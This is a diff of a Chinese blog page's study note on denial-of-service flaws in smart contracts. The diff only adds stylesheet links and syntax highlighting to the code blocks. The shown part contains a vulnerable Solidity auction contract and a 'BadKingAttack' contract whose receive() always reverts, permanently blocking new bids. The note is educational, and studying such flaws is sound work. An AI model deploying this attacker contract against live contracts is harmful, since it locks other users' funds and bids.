@@ -1,4 +1,4 @@
-<!DOCTYPE html><html lang="zh-Hans" data-theme="dark"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>拒绝服务攻击漏洞 | 沉于思，录以隙</title><meta name="description" content="# 拒绝服务攻击漏洞 (Denial of Service - DoS) > **标签:** #漏洞类型/执行流中断 | #协议类型/DeFi/拍卖/分红机制 | #严重程度/High ## 📌 1. TL;DR (一句话快速回顾) * **本质成因**：智能合约在处理核心业务"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;500;600;700&family=Zhi+Mang+Xing&family=Noto+Serif+SC:wght@400;500;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet"><link rel="stylesheet" href="/_astro/_folder_.k9dOAKhk.css"></head> <body class="is-post-page"> <div class="deep-space-container" id="deep-space-bg" aria-hidden="true" data-astro-cid-nnyeyk4f> <div class="ds-nebula" data-astro-cid-nnyeyk4f></div> <canvas class="ds-stars" id="ds-canvas" data-astro-cid-nnyeyk4f></canvas> <div class="ds-grid" data-astro-cid-nnyeyk4f></div> <div class="ds-noise" data-astro-cid-nnyeyk4f></div> </div> <script type="module">let r;function o(){const e=document.getElementById("ds-canvas");if(!e)return;const i=e.getContext("2d");if(!i)return;let a=e.width=window.innerWidth,n=e.height=window.innerHeight,h=Array.from({length:250},()=>({x:Math.random()*a,y:Math.random()*n,z:Math.random()*2+.1,opacity:Math.random()*.8+.1,pulse:Math.random()*.01,pulseDir:Math.random()>.5?1:-1}));r&&cancelAnimationFrame(r);const d=()=>{i.clearRect(0,0,a,n),h.forEach(t=>{t.opacity+=t.pulse*t.pulseDir;const c=.8;t.opacity>=c&&(t.opacity=c,t.pulseDir=-1),t.opacity<=.05&&(t.opacity=.05,t.pulseDir=1),i.fillStyle=`rgba(226, 232, 240, ${t.opacity})`,i.beginPath(),i.arc(t.x,t.y,t.z*.9,0,Math.PI*2),i.fill(),t.x-=.15/t.z,t.y-=.05/t.z,t.x<0&&(t.x=a),t.y<0&&(t.y=n)}),r=requestAnimationFrame(d)};d(),window.addEventListener("resize",()=>{a=e.width=window.innerWidth,n=e.height=window.innerHeight})}document.addEventListener("astro:page-load",o);document.readyState==="complete"?o():window.addEventListener("load",o);</script>  <header class="topbar topbar-post"> <a class="brand" href="/">沉于思，录以隙</a> <nav class="nav-links"> <a href="/" class>首页</a> <a href="/folders" class>目录</a> <a href="/tags" class>标签</a> <a href="/#archive-search">搜索</a> </nav> </header> <main id="main-content" class="page-shell page-main is-post-main">  <section class="post-cover-hero"> <div class="post-cover-hero__inner"> <p class="post-cover-hero__eyebrow">web3</p> <h1 class="post-cover-hero__title">拒绝服务攻击漏洞</h1> </div> </section> <div class="article-shell" id="article-shell"> <a class="back-link" href="/">&larr; 返回首页花园</a> <div class="article-layout"> <article class="article-panel"> <header class="article-header"> <div class="article-directory"> <a href="/folders" class="directory-link">目录</a>  <span class="directory-sep">/</span> <a href="/folders/web3/" class="directory-link">web3</a>   <span class="directory-sep">/</span> <span class="directory-text">漏洞笔记</span>  </div> <div class="article-meta-row"> <span>2026/3/10</span> <span>web3</span> <span>web3 · 漏洞笔记</span> </div> <div class="tag-row article-header__tags"> <a href="/tags/web3/" class="tag">#web3</a><a href="/tags/漏洞笔记/" class="tag">#漏洞笔记</a> </div> <p class="source-note">来源路径：web3/漏洞笔记/拒绝服务攻击漏洞.md</p> </header> <div class="article-main"> <div class="article-content"><h1>拒绝服务攻击漏洞 (Denial of Service - DoS)</h1><blockquote>
+<!DOCTYPE html><html lang="zh-Hans" data-theme="dark"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>拒绝服务攻击漏洞 | 沉于思，录以隙</title><meta name="description" content="# 拒绝服务攻击漏洞 (Denial of Service - DoS) > **标签:** #漏洞类型/执行流中断 | #协议类型/DeFi/拍卖/分红机制 | #严重程度/High ## 📌 1. TL;DR (一句话快速回顾) * **本质成因**：智能合约在处理核心业务"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;500;600;700&family=Zhi+Mang+Xing&family=Noto+Serif+SC:wght@400;500;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.11.1/styles/github-dark.min.css"><link rel="stylesheet" href="/_astro/_folder_.k9dOAKhk.css"></head> <body class="is-post-page"> <div class="deep-space-container" id="deep-space-bg" aria-hidden="true" data-astro-cid-nnyeyk4f> <div class="ds-nebula" data-astro-cid-nnyeyk4f></div> <canvas class="ds-stars" id="ds-canvas" data-astro-cid-nnyeyk4f></canvas> <div class="ds-grid" data-astro-cid-nnyeyk4f></div> <div class="ds-noise" data-astro-cid-nnyeyk4f></div> </div> <script type="module">let r;function o(){const e=document.getElementById("ds-canvas");if(!e)return;const i=e.getContext("2d");if(!i)return;let a=e.width=window.innerWidth,n=e.height=window.innerHeight,h=Array.from({length:250},()=>({x:Math.random()*a,y:Math.random()*n,z:Math.random()*2+.1,opacity:Math.random()*.8+.1,pulse:Math.random()*.01,pulseDir:Math.random()>.5?1:-1}));r&&cancelAnimationFrame(r);const d=()=>{i.clearRect(0,0,a,n),h.forEach(t=>{t.opacity+=t.pulse*t.pulseDir;const c=.8;t.opacity>=c&&(t.opacity=c,t.pulseDir=-1),t.opacity<=.05&&(t.opacity=.05,t.pulseDir=1),i.fillStyle=`rgba(226, 232, 240, ${t.opacity})`,i.beginPath(),i.arc(t.x,t.y,t.z*.9,0,Math.PI*2),i.fill(),t.x-=.15/t.z,t.y-=.05/t.z,t.x<0&&(t.x=a),t.y<0&&(t.y=n)}),r=requestAnimationFrame(d)};d(),window.addEventListener("resize",()=>{a=e.width=window.innerWidth,n=e.height=window.innerHeight})}document.addEventListener("astro:page-load",o);document.readyState==="complete"?o():window.addEventListener("load",o);</script>  <header class="topbar topbar-post"> <a class="brand" href="/">沉于思，录以隙</a> <nav class="nav-links"> <a href="/" class>首页</a> <a href="/folders" class>目录</a> <a href="/tags" class>标签</a> <a href="/#archive-search">搜索</a> </nav> </header> <main id="main-content" class="page-shell page-main is-post-main">  <section class="post-cover-hero"> <div class="post-cover-hero__inner"> <p class="post-cover-hero__eyebrow">web3</p> <h1 class="post-cover-hero__title">拒绝服务攻击漏洞</h1> </div> </section> <div class="article-shell" id="article-shell"> <a class="back-link" href="/">&larr; 返回首页花园</a> <div class="article-layout"> <article class="article-panel"> <header class="article-header"> <div class="article-directory"> <a href="/folders" class="directory-link">目录</a>  <span class="directory-sep">/</span> <a href="/folders/web3/" class="directory-link">web3</a>   <span class="directory-sep">/</span> <span class="directory-text">漏洞笔记</span>  </div> <div class="article-meta-row"> <span>2026/3/10</span> <span>web3</span> <span>web3 · 漏洞笔记</span> </div> <div class="tag-row article-header__tags"> <a href="/tags/web3/" class="tag">#web3</a><a href="/tags/漏洞笔记/" class="tag">#漏洞笔记</a> </div> <p class="source-note">来源路径：web3/漏洞笔记/拒绝服务攻击漏洞.md</p> </header> <div class="article-main"> <div class="article-content"><h1>拒绝服务攻击漏洞 (Denial of Service - DoS)</h1><blockquote>
 <p><strong>标签:</strong> #漏洞类型/执行流中断 | #协议类型/DeFi/拍卖/分红机制 | #严重程度/High</p>
 </blockquote>
 <h2 id="section-1">📌 1. TL;DR (一句话快速回顾)</h2><ul>
@@ -32,35 +32,35 @@
 <li><strong>[引爆卡死]</strong>: 资金池启动分发业务，发给其他人都很正常。轮到给黑客合约打款时，黑客合约像黑洞一样吸干了系统给予这笔交易的所有剩余 Gas，最终抛出 <code>Out of Gas</code>，池子剩余的业务代码全部无法执行。</li>
 </ol>
 <hr>
-<h2 id="section-8">💻 4. 关键代码示例 (Snippets)</h2><h3 id="section-9">漏洞代码 (被动退款卡死型)</h3><pre><code class="language-solidity">contract Auction {
-    address public currentLeader;
-    uint256 public highestBid;
+<h2 id="section-8">💻 4. 关键代码示例 (Snippets)</h2><h3 id="section-9">漏洞代码 (被动退款卡死型)</h3><pre><code class="language-solidity">contract <span class="hljs-title class_">Auction</span> {
+    address <span class="hljs-keyword">public</span> currentLeader;
+    uint256 <span class="hljs-keyword">public</span> highestBid;
 
-    // 致命逻辑点：把退款和更新新人的数据强制绑定在了一次执行里
-    function bid() public payable {
-        require(msg.value &gt; highestBid, &quot;Not enough ETH to outbid&quot;);
+    <span class="hljs-comment">// 致命逻辑点：把退款和更新新人的数据强制绑定在了一次执行里</span>
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">bid</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> payable {
+        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">value</span> &gt; highestBid, <span class="hljs-string">&quot;Not enough ETH to outbid&quot;</span>);
 
-        if (currentLeader != address(0)) {
-            // 这行如果失败抛出异常，整个函数全部连坐，下面的赋予新任领导人直接没戏
-            payable(currentLeader).transfer(highestBid); 
+        <span class="hljs-keyword">if</span> (currentLeader != <span class="hljs-title function_">address</span>(<span class="hljs-number">0</span>)) {
+            <span class="hljs-comment">// 这行如果失败抛出异常，整个函数全部连坐，下面的赋予新任领导人直接没戏</span>
+            <span class="hljs-title function_">payable</span>(currentLeader).<span class="hljs-title function_">transfer</span>(highestBid); 
         }
 
-        currentLeader = msg.sender;
-        highestBid = msg.value;
+        currentLeader = msg.<span class="hljs-property">sender</span>;
+        highestBid = msg.<span class="hljs-property">value</span>;
     }
 }
 </code></pre>
-<h3 id="section-10">攻击核心逻辑 (Attacker Contract)</h3><pre><code class="language-solidity">contract BadKingAttack {
-    // 强行出价抢占王座
-    function hack(address target) external payable {
-        (bool ok, ) = target.call{value: msg.value}(&quot;&quot;);
-        require(ok);
+<h3 id="section-10">攻击核心逻辑 (Attacker Contract)</h3><pre><code class="language-solidity">contract <span class="hljs-title class_">BadKingAttack</span> {
+    <span class="hljs-comment">// 强行出价抢占王座</span>
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">hack</span>(<span class="hljs-params">address target</span>) external payable {
+        (bool ok, ) = target.<span class="hljs-property">call</span>{<span class="hljs-attr">value</span>: msg.<span class="hljs-property">value</span>}(<span class="hljs-string">&quot;&quot;</span>);
+        <span class="hljs-built_in">require</span>(ok);
     }
 
-    // [致命防线]：无 receive，或者在此显式地写入 revert()
-    // 以后只要有人给我退钱，我就当场死给你看，拽着对方的交易一起坠机
-    receive() external payable {
-        revert(&quot;I won&#39;t accept any ETH. HAHAHA!&quot;);
+    <span class="hljs-comment">// [致命防线]：无 receive，或者在此显式地写入 revert()</span>
+    <span class="hljs-comment">// 以后只要有人给我退钱，我就当场死给你看，拽着对方的交易一起坠机</span>
+    <span class="hljs-title function_">receive</span>() external payable {
+        <span class="hljs-title function_">revert</span>(<span class="hljs-string">&quot;I won&#x27;t accept any ETH. HAHAHA!&quot;</span>);
     }
 }
 </code></pre>
